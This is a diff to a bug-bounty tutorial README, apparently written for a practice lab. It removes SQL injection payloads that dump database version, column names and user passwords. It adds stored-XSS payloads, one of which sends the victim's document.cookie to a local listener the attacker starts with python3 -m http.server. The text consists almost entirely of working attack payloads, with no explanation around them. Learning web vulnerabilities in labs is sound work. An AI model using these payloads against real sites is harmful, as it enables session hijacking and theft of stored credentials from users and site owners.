@@ -1,13 +1,14 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
+## 18.XSS-store
+
+### low in name & message
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
-
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
-
-1' OR 1=1 UNION SELECT user, password FROM users #
+python3 -m http.server 3000
+<script>alert("XSS");</script>
+```
+### change textarea size
+```
+<script>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
 ```
